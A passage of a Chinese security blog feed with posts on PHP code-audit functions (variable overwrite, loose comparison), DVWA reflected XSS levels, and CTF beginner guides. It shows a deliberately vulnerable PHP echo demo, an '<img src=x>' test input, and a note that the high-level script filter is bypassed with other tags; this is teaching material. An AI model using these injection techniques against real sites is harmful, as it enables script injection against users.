则使用宽松的比较。<br>该函数有一个特性，比较之前会进行自动类型转换。<br><code>in_array($str,$arr)判断$str是否在$arr数组里</code><br><img src="http://static.zybuluo.com/1kbfree/jx7080p95vigv0hnpfkgnu8u/image_1cartm29n1seoieq1o52b2qbn72d.png" alt="image_1cartm29n1seoieq1o52b2qbn72d.png-28.9kB"></p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p><strong>如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域：</strong><br><code>void parse_str ( string $str [, array &amp;$arr ] )</code><br><strong>本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突：</strong><br><code>int extract ( array &amp;$var_array [, int $extract_type = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code></p><p><code>bool mb_parse_str ( string $encoded_string [, array &amp;$result ] )</code><br>解析 <code>GET/POST/COOKIE</code> 数据并设置全局变量。 由于 PHP 不提供原始 POST/COOKIE 数据，目前它仅能够<br>用于 GET 数据。 它解析了 URL 编码过的数据，检测其编码，并转换编码为内部编码，然后设置其值为 array<br>的 result 或者全局变量。<br><code>bool import_request_variables ( string $types [, string $prefix ] )</code><br>将 <code>GET／POST／Cookie</code> 变量导入到全局作用域中。如果你禁止了 <code>register_globals</code>，但又想用到一些全局变<br>量，那么此函数就很有用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"first=value&amp;arr[]=foo+bar&amp;arr[]=baz"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line">parse_str($str, $output);</span><br><span class="line"><span class="keyword">echo</span> $output[<span class="string">'first'</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">41</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不建议这么用</span></span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> $first;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> $arr[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> $arr[<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h3><p><code>array glob ( string $pattern [, int $flags = 0 ] )</code><br>glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般shell所用的规则一样。不进行缩写扩展或参数替代。<br><img src="http://static.zybuluo.com/1kbfree/osbwswf3zlroqoo14rq9jjfj/image_1caru9aiu1a5v1qr2p7m1pjlpjq2q.png" alt="image_1caru9aiu1a5v1qr2p7m1pjlpjq2q.png-46.9kB"><br><code>var_dump(glob(&#39;c*.php&#39;)); //列出c开头的PHP文件</code></p><h3 id="无参数获取信息"><a href="#无参数获取信息" class="headerlink" title="无参数获取信息"></a>无参数获取信息</h3><p><strong>返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量:</strong></p><p><code>array get_defined_vars ( void )</code><br><strong>返回当前所有已定义的常量名和值。 这包含 define() 函数所创建的，也包含了所有扩展所创建的:</strong><br><code>array get_defined_constants ([ bool $categorize = false ] )</code><br><strong>返回一个包含所有已定义函数列表的多维数组:</strong><br><code>array get_defined_functions ( void )</code><br><strong>返回所有被 include、 include_once、 require 和 require_once:</strong><br><code>array get_included_files ( void )</code></p><p><img src="http://static.zybuluo.com/1kbfree/v8vegj7d7ahhxafqer3gdx7s/image_1carv1gbf9am1c0rnic1gs9156f37.png" alt="image_1carv1gbf9am1c0rnic1gs9156f37.png-218.1kB"></p><hr><p><strong>rand()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/uv0q2objv84c5sm4z37sk41e/image_1carsup0fqrg1uipj1q1oeb1okv13.png" alt="image_1carsup0fqrg1uipj1q1oeb1okv13.png-29.6kB"></p><hr><p><strong>$_REQUEST用法：</strong><br><img src="http://static.zybuluo.com/1kbfree/oce7sp8x0ykgb7ju4x6shxhl/image_1cb26fq2i1upk16alpd18eb8pg1g.png" alt="image_1cb26fq2i1upk16alpd18eb8pg1g.png-30kB"></p><hr><p><strong>file_exists()函数：</strong><br>检查文件或目录是否存在<br><img src="http://static.zybuluo.com/1kbfree/5g83d66qgky6x3w7ws87h8oh/image_1cauetnlg17n874k1qqf11suk537.png" alt="image_1cauetnlg17n874k1qqf11suk537.png-34.8kB"></p><hr><p><strong>exit用法：</strong><br><img src="http://static.zybuluo.com/1kbfree/2dqkjyv4nuqlkmjkianj3b6j/image_1caufp0at1lt18k71uqkhg51eab3k.png" alt="image_1caufp0at1lt18k71uqkhg51eab3k.png-181.2kB"><br><em>多处用在<code>install.php</code>里，因为成功安装一次之后就能再一次运行安装了，除非将exit删除了。</em></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 编程 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Dvwa中xss的impossible等级是如何防御的</title>
      <link href="/2018/05/25/Dvwa%E4%B8%ADxss%E7%9A%84impossible%E7%AD%89%E7%BA%A7%E6%98%AF%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%E7%9A%84/"/>
      <url>/2018/05/25/Dvwa%E4%B8%ADxss%E7%9A%84impossible%E7%AD%89%E7%BA%A7%E6%98%AF%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%E7%9A%84/</url>
      <content type="html"><![CDATA[<blockquote><p>在之前分别讲了Dvwa的Xss测试的<code>Low</code>、<code>Medium</code>、<code>High</code>等级，这节课就深入的来讲<code>impossible</code>如何防御的( 其实之前文章也有讲过，不详细，这节课就深入的来讲解一下 )</p></blockquote><a id="more"></a><p>老套路，直接看源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><div class="note danger"><p>这段代码中的<code>checkToken()</code>函数是用于防御<code>Csrf</code>攻击的，先不用管，我们先来看看这个<code>htmlspecialchars()</code>函数</p></div><h1 id="官方解释"><a href="#官方解释" class="headerlink" title="官方解释"></a>官方解释</h1><div class="note primary"><p>htmlspecialchars — 将特殊字符转换为 HTML 实体</p></div><h3 id="执行转换"><a href="#执行转换" class="headerlink" title="执行转换"></a><center>执行转换</center></h3><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">替换后</th></tr></thead><tbody><tr><td style="text-align:center">&amp; （和号）</td><td style="text-align:center">成为 <code>&amp;amp;</code></td></tr><tr><td style="text-align:center">“ （双引号）</td><td style="text-align:center">成为 <code>&amp;quot;</code></td></tr><tr><td style="text-align:center">‘ （单引号）</td><td style="text-align:center">成为 <code>&#39;</code></td></tr><tr><td style="text-align:center">&lt; （小于）</td><td style="text-align:center">成为 <code>&amp;lt;</code></td></tr><tr><td style="text-align:center">> （大于）</td><td style="text-align:center">成为 <code>&amp;gt;</code></td></tr></tbody></table><h1 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h1><h2 id="未过滤"><a href="#未过滤" class="headerlink" title="未过滤"></a>未过滤</h2><p>先看一段代码简单的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;你好，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $name;<span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1/myphp/demo.php?name=1</code>:</p><p><img src="http://static.zybuluo.com/1kbfree/al7qk4pjqlion3hbqsw4ierb/image_1ceefa1be1bbm1rnk1mnt1jn019nc9.png" alt="image_1ceefa1be1bbm1rnk1mnt1jn019nc9.png-86.4kB"></p><p>访问<code>http://127.0.0.1/myphp/demo.php?name=&lt;img src=x&gt;</code>:</p><p><img src="http://static.zybuluo.com/1kbfree/au5kj4jajtjmra5kiy2c0jft/image_1ceefbiqtarl1pcuc268a01lm7m.png" alt="image_1ceefbiqtarl1pcuc268a01lm7m.png-33.9kB"><br><em>可见，这个是存在Xss的，那么我们用<code>htmlspecialchars</code>函数来过滤~</em></p><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">        $name = htmlspecialchars( $name );</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;你好，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $name;<span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>继续访问<code>http://127.0.0.1/myphp/demo.php?name=&lt;img src=x&gt;</code>:</p><p><img src="http://static.zybuluo.com/1kbfree/80yqz9yz6403402w5i9qx44q/image_1ceefgvqvh1ta2riv01papfcb13.png" alt="image_1ceefgvqvh1ta2riv01papfcb13.png-34.8kB"></p><p><em>看到这里，你们就会好奇了，为什么会直接把输入的内容输出出来，而不是以代码被解析？我们打开审查元素看一看(F12)</em></p><p><img src="http://static.zybuluo.com/1kbfree/vk4ukytvdztquz76v0qr25zf/image_1ceefjr3mik51606kc21ete15ct1g.png" alt="image_1ceefjr3mik51606kc21ete15ct1g.png-31.9kB"><br><em>我们可以发现这里是把<code>&lt;</code>变成了<code>&amp;lt;</code>,把’&gt;’变成了<code>&amp;gt;</code>，从而导致了代码只会原样输出而不会当成代码来编译</em></p><p>如果你还困惑的，我再给你看一段代码:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好，&amp;lt;img src=x&amp;gt;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="comment">&lt;!-- 注意看这里 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>访问<code>http://127.0.0.1/myphp/demo.php</code>:</p><p><img src="http://static.zybuluo.com/1kbfree/eeeo1h0i9gjlamr1ctt17uud/image_1ceefpck81ibnca2re9bvb1tpd1t.png" alt="image_1ceefpck81ibnca2re9bvb1tpd1t.png-74kB"></p><div class="note success"><p>Dvwa演练平台的Xss反射型部分撒花完结~</p></div><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> Dvwa </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基于DVWA的反射型Xss测试平台high等级讲解</title>
      <link href="/2018/05/25/%E5%9F%BA%E4%BA%8EDVWA%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXss%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0high%E7%AD%89%E7%BA%A7%E8%AE%B2%E8%A7%A3/"/>
      <url>/2018/05/25/%E5%9F%BA%E4%BA%8EDVWA%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXss%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0high%E7%AD%89%E7%BA%A7%E8%AE%B2%E8%A7%A3/</url>
      <content type="html"><![CDATA[<div class="note info"><p>这是继上节课[基于DVWA的Xss测试平台Medium等级讲解]的<code>high</code>等级</p></div><a id="more"></a><p>废话不多说，直接开始了~</p><p>设置等级、查看源代码等操作不再重复了，直接把<code>high</code>等级的代码复制到这里:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><div class="note primary"><p>最主要的看这行代码<code>$name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</code>，这个是正则匹配，把<code>(.*)</code>里的字符统统变成<code>&#39;&#39;</code>；这里的<code>i</code>就表示这个匹配是不区分大小写的，所以上一个等级的大写绕过大法是没用了，可以说在这里基本上是在<code>script</code>标签里的代码都不能实现了，那么我们可以用另一种办法实现</p></div><h3 id="利用其它标签执行js代码"><a href="#利用其它标签执行js代码" class="headerlink" title="利用其它标签执行js代码:"></a>利用其它标签执行js代码:</h3><p><img src="http://static.zybuluo.com/1kbfree/lfivaz3cob3p8jmbf7a5hhd8/image_1cebqjmh9d4m1kn8p4lc0c26k9.png" alt="image_1cebqjmh9d4m1kn8p4lc0c26k9.png-107kB"></p><h3 id="如何防御？"><a href="#如何防御？" class="headerlink" title="如何防御？"></a>如何防御？</h3><p><strong>这里我就不再重复了，前面两章说的十分清楚了~</strong></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> Dvwa </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF比赛模式</title>
      <link href="/2018/05/25/CTF%E6%AF%94%E8%B5%9B%E6%A8%A1%E5%BC%8F/"/>
      <url>/2018/05/25/CTF%E6%AF%94%E8%B5%9B%E6%A8%A1%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h2 id="目前主要的CTF比赛模式如下"><a href="#目前主要的CTF比赛模式如下" class="headerlink" title="目前主要的CTF比赛模式如下"></a>目前主要的CTF比赛模式如下</h2><a id="more"></a><h3 id="一、解题模式（Jeopardy）"><a href="#一、解题模式（Jeopardy）" class="headerlink" title="一、解题模式（Jeopardy）"></a>一、解题模式（Jeopardy）</h3><p>在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与比赛，比赛以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛，比赛一般会持续48小时及以上。题目类型主要包含逆向分析、漏洞挖掘与利用、移动安全、Web安全、密码、取证、隐写、编程、流量分析等等类别。</p><h3 id="二、攻防模式（Attack-Defense）"><a href="#二、攻防模式（Attack-Defense）" class="headerlink" title="二、攻防模式（Attack-Defense）"></a>二、攻防模式（Attack-Defense）</h3><p>在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负。这种赛制一般在线下举行，在这种赛制中，不仅仅是比拼参赛队员的智力和技术，也比拼体力（因为比赛一般都会持续48小时及以上），同时也比拼团队之间的分工配合与合作。</p><h3 id="三、混合模式（Mix）"><a href="#三、混合模式（Mix）" class="headerlink" title="三、混合模式（Mix）"></a>三、混合模式（Mix）</h3><p>结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。(改自<a href="https://link.zhihu.com/?target=http%3A//baike.baidu.com/subview/2735962/16211061.htm" target="_blank" rel="noopener">ctf（夺旗赛）</a>)</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载文章 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF如何入门</title>
      <link href="/2018/05/25/CTF%E5%A6%82%E4%BD%95%E5%85%A5%E9%97%A8/"/>
      <url>/2018/05/25/CTF%E5%A6%82%E4%BD%95%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<div class="note info"><p>希望你抱着学习和提高的目的进入CTF坑，不要一味为了比赛而比赛迷失其中，勿忘初心，方能始终，与君共勉：）</p></div><a id="more"></a><h2 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h2><ul><li>Web</li><li>Crypto</li><li>PWN</li><li>Misc<ul><li>stego</li><li>forensic</li><li>…</li></ul></li><li>Reverse</li><li>PPC(Professonal ProgramCoder)</li></ul><p>国际比赛：DEFCON资格赛<br>国内比赛：XCTF联赛</p><h2 id="打CTF的意义"><a href="#打CTF的意义" class="headerlink" title="打CTF的意义"></a>打CTF的意义</h2><ul><li>思维能力</li><li>快速学习能力</li><li>技术能力</li><li>如何入门</li><li>编程语言基础（C语言、汇编语言、大部分脚本语言）</li><li>数学基础（算法、密码学）</li><li>脑洞大开、并落地（天马行空的想象、推理解密）</li><li>体力耐力（通宵熬夜不睡觉，学习新技术、突破难关，结果不重要，过程很重要）</li></ul><h2 id="如何学"><a href="#如何学" class="headerlink" title="如何学?"></a>如何学?</h2><ul><li>恶补基础知识</li><li>从脑洞开始</li><li>从基础题出发<ul><li>单、双点知识 </li></ul></li><li>学习信息安全专业知识</li><li>锻炼体力耐力</li></ul><h3 id="学之前的思考"><a href="#学之前的思考" class="headerlink" title="学之前的思考"></a>学之前的思考</h3><h4 id="分析赛题情况"><a href="#分析赛题情况" class="headerlink" title="分析赛题情况"></a>分析赛题情况</h4><ul><li>Crypto偏重对数学、算法的学习</li><li>Web偏重发散思惟、对技巧沉淀、快速搜索能力的挑战，漏洞点几类</li><li>Misc则更为复杂：隐写类、图片数据分析、数据还原、流量分析、大数据</li></ul><h4 id="分析自身兴趣"><a href="#分析自身兴趣" class="headerlink" title="分析自身兴趣"></a>分析自身兴趣</h4><ul><li>PWN+Re+Crypto随机搭配</li><li>Web+Misc组合</li><li>精力有限先从一两个方向做起</li></ul><h4 id="如何恶补知识"><a href="#如何恶补知识" class="headerlink" title="如何恶补知识"></a>如何恶补知识</h4><ul><li>linux、组原、OS、网络协议分析</li><li>二进制：IDA工具使用，f5插件、OD、逆向工程、密码学、缓冲区溢出</li></ul><h4 id="推荐书籍"><a href="#推荐书籍" class="headerlink" title="推荐书籍"></a>推荐书籍</h4><ul><li>RE for Beginners(逆向工程入门。德国)</li><li>IDA PRO权威指南</li><li>揭秘家用路由器0day漏洞挖掘技术</li><li>自己动手写操作系统</li><li>黑客攻防技术宝典：系统实战篇</li><li>web：网络安全、内网渗透、数据库安全、OWASPTOP10</li><li>Web应用安全权威指南。日本！！！宏观</li><li>Web前端黑客技术揭秘——总结、吃透则直线上升、核心技术点都包含</li><li>黑客秘籍-渗透测试使用指南</li><li>黑客攻防技术宝典：web实战篇</li><li>代码审计：企业级web代码安全架构</li></ul><h3 id="如何成为一个赛棍"><a href="#如何成为一个赛棍" class="headerlink" title="如何成为一个赛棍"></a>如何成为一个赛棍</h3><h4 id="从基础题目出发"><a href="#从基础题目出发" class="headerlink" title="从基础题目出发"></a>从基础题目出发</h4><ul><li><a href="http://ctf.idf.cn" target="_blank" rel="noopener">http://ctf.idf.cn</a> idf实验室，非常基础，单点知识，挫败感较小</li><li><a href="http://www.ichunqiu.com" target="_blank" rel="noopener">www.ichunqiu.com</a> 线下线上题目复现</li><li><a href="http://oj.xctf.org.cn" target="_blank" rel="noopener">http://oj.xctf.org.cn</a> xctf历年题目，较难</li><li><a href="http://www.wechall.net/challs" target="_blank" rel="noopener">www.wechall.net/challs</a> 非常入门的国外CTF 入门网站 国内安全大牛出发点，可首选</li><li><a href="http://canyouhack.it" target="_blank" rel="noopener">http://canyouhack.it</a> 非常入门，涉及一些移动安全</li><li><a href="http://microcorruption.com/login" target="_blank" rel="noopener">http://microcorruption.com/login</a> 很酷炫，游戏化，二进制方向</li><li><a href="http://smashthestack.org/" target="_blank" rel="noopener">http://smashthestack.org/</a> war game 非常简洁的内容 ssh连入即玩</li><li><a href="http://overthewire.org/wargames" target="_blank" rel="noopener">http://overthewire.org/wargames</a> 老牌wargame,国内资料较多，WP: <a href="http://drops.wooyun.org/author/litao3rd" target="_blank" rel="noopener">http://drops.wooyun.org/author/litao3rd</a></li><li><a href="http://exploit-exercises.com" target="_blank" rel="noopener">http://exploit-exercises.com</a> 老牌wargame，国内资料较多</li><li><a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">http://pwnable.kr/play.php</a> 100题左右，较基础</li><li><a href="http://ctf.moonsos.com/pentest/index.php" target="_blank" rel="noopener">http://ctf.moonsos.com/pentest/index.php</a> web安全核心技术点</li><li><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a> xss 国外测试平台,不考核对错，自己尝试</li><li><a href="http://redtiger.labs.overthewire.org" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org</a> sql注入挑战赛</li></ul><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li>burp、ida</li><li><a href="https://github.com/truongkma/ctf-tools" target="_blank" rel="noopener">https://github.com/truongkma/ctf-tools</a></li><li><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></li><li><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></li><li><a href="https://github.com/TUCTF/Tools" target="_blank" rel="noopener">https://github.com/TUCTF/Tools</a></li></ul><blockquote><p>以练促赛、以赛养练：都参与，不在乎名次，看多个WP，对比，重视思路，复现过程，寻找相关题目。<br>以练促赛：选择一场已经存在WP的比赛<br>以赛养练：参加一场最新的CTF，名次不重要，赛后要吃透，猜测作者怎么想，跟着作者想法走<br><a href="https://ctftime.org/" target="_blank" rel="noopener">https://ctftime.org/</a> 国际比赛<br><a href="http://www.xctf.org.cn/" target="_blank" rel="noopener">http://www.xctf.org.cn/</a> 国内比赛</p></blockquote><h2 id="组建团队"><a href="#组建团队" class="headerlink" title="组建团队:"></a>组建团队:</h2><h3 id="强力成员画像"><a href="#强力成员画像" class="headerlink" title="强力成员画像"></a>强力成员画像</h3><ul><li>思维跳跃：灵活、不钻牛角尖</li><li>专注：遇到问题不放弃直到解决</li><li>耐力：可以一昼夜不睡觉地研究技术</li><li>团队精神：责任、凝聚（相信将来总会得第一）、分享（先富带动后富）</li><li>有以上三条为强力成员，四条可为队长</li></ul><h3 id="组建团队要解决的问题"><a href="#组建团队要解决的问题" class="headerlink" title="组建团队要解决的问题"></a>组建团队要解决的问题</h3><ul><li>新人招募：如何评判新人潜力</li><li>队员培养：如何快速培养队伍能力</li><li>梯队有序：如何建立梯队层级</li><li>纪律严格：如何拒绝无团队精神的成员</li></ul><blockquote class="blockquote-center"><p>坚持不懈，相信未来我们一定会成为第一的！<br>十年寒窗无人问，一举成名天下知！<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载文章 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基于DVWA的反射型Xss测试平台Medium等级讲解</title>
